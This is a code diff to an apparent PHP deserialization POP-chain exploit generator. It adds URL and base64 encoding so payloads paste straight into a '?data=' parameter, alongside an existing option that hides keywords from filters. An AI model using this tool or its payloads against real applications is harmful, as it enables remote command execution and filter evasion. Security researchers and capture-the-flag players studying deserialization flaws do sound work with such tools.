@@ -14,7 +14,7 @@ use PopChain\Payload\PayloadBuilder;
  */
 final class Application
 {
-    public const VERSION = '1.3.1';
+    public const VERSION = '1.4.0';
 
     private const DEFAULT_ENTRIES = ['__destruct', '__wakeup', '__unserialize'];
 
@@ -85,6 +85,7 @@ final class Application
             'download_failed' => 'Download failed: {url} (page may require login or is not raw PHP source)',
             'not_raw_source' => 'URL returned an HTML page instead of raw PHP source: {url} (the page probably executes PHP or uses highlight_file)',
             'html_source_extracted' => '[i] URL looks like highlighted PHP source; extracted the source code from the HTML',
+            'bad_encode' => '--encode only accepts url or base64, got: {value}',
             'path_missing' => 'Path not found: {path}',
             'bad_numeric' => '--{option} must be a positive integer, got: {value}',
             'no_classes' => 'No PHP classes found in: {path}',
@@ -112,6 +113,7 @@ final class Application
             'download_failed' => '下载失败: {url}（页面可能需要登录，或不是纯 PHP 源码）',
             'not_raw_source' => 'URL 返回的是 HTML 页面，不是 PHP 源码: {url}（页面可能执行了 PHP，或用了 highlight_file）',
             'html_source_extracted' => '[i] URL 看起来是高亮后的 PHP 源码页，已从 HTML 里提取出源代码',
+            'bad_encode' => '--encode 只接受 url 或 base64，当前值: {value}',
             'path_missing' => '路径不存在: {path}',
             'bad_numeric' => '--{option} 必须是正整数，当前值: {value}',
             'no_classes' => '没有在 {path} 里找到 PHP 类',
@@ -146,6 +148,13 @@ final class Application
         if (!in_array($command, ['scan', 'find'], true)) {
             fwrite(STDERR, self::t('unknown_command', ['command' => $command]) . "\n\n");
             self::help();
+            return 2;
+        }
+
+        $encode = strtolower((string) self::option($options, 'encode', ''));
+        if ($encode !== '' && !in_array($encode, ['url', 'base64'], true)) {
+            fwrite(STDERR, '[!] ' . self::t('bad_encode', ['value' => $encode]) . "
+");
             return 2;
         }
 
@@ -362,6 +371,8 @@ Options:
   --include-vendor     Also scan vendor/
   --json               JSON output
   --obfuscate          Emit strings as S: hex escapes, hiding keywords from regex filters
+  --encode=url|base64  Encode the payload for copy/paste: url for ?data=, base64 for log-safe text
+                       (--output writes the encoded form as well)
 
 Examples:
   popchain scan ./src
@@ -416,6 +427,8 @@ php_pop_framework v{$version} — PHP 反序列化 POP 链自动生成器
   --include-vendor     连 vendor/ 目录一起扫描
   --json               以 JSON 输出
   --obfuscate          字符串改用 S: 十六进制转义，绕过关键字过滤
+  --encode=url|base64  payload 直接编码成可直接粘贴的形式：url 用于 ?data=，base64 便于文本传输
+                       （--output 也写编码后的形式）
 
 示例:
   popchain scan ./src
@@ -568,6 +581,7 @@ TXT;
         }
 
         $builder = new PayloadBuilder($classes, (bool) self::option($options, 'obfuscate', false));
+        $encode = strtolower((string) self::option($options, 'encode', ''));
         $legacyValue = self::option($options, 'cmd', null);
 
         $records = [];
@@ -575,6 +589,7 @@ TXT;
             $category = $chain->sink?->category;
             $value = self::valueFor($category, $options, $legacyValue);
             $payloadString = $builder->build($chain, $value);
+            $encodedPayload = self::encodePayload($payloadString, $encode);
             $records[] = [
                 'entry' => $chain->entryClass->name . '::' . $chain->entryMethod->name,
                 'standalone' => in_array(strtolower($chain->entryMethod->name), self::DESERIALIZE_ENTRIES, true),
@@ -593,6 +608,7 @@ TXT;
                     'arg' => $chain->sink->arg->describe(),
                 ],
                 'payload' => $payloadString,
+                'payload_encoded' => $encodedPayload,
                 'payload_complete' => $builder->sinkValueWritten,
                 'needs_wakeup_bypass' => $builder->wakeupBypassUsed,
             ];
@@ -602,7 +618,7 @@ TXT;
         if (is_string($outputFile) && $outputFile !== '') {
             $content = self::option($options, 'json', false)
                 ? json_encode(['tool' => 'php_pop_framework', 'version' => self::VERSION, 'path' => $label, 'chains' => $records], JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE)
-                : implode("\n", array_column($records, 'payload'));
+                : implode("\n", array_column($records, 'payload_encoded'));
             if (@file_put_contents($outputFile, $content . "\n") === false) {
                 fwrite(STDERR, '[!] ' . self::t('output_failed', ['file' => $outputFile]) . "\n");
                 return 2;
@@ -664,7 +680,7 @@ TXT;
                     $record['sink']['arg'],
                 );
             }
-            echo '    payload: ', self::displayable($record['payload']), "\n\n";
+            echo '    payload: ', self::displayable($record['payload_encoded']), "\n\n";
         }
 
         foreach ($parser->warnings() as $warning) {
@@ -717,6 +733,15 @@ TXT;
             return self::DEFAULT_VALUES[$category];
         }
         return 'id';
+    }
+
+    private static function encodePayload(string $payload, string $encode): string
+    {
+        return match ($encode) {
+            'url' => rawurlencode($payload),
+            'base64' => base64_encode($payload),
+            default => $payload,
+        };
     }
 
     private static function displayable(string $payload): string
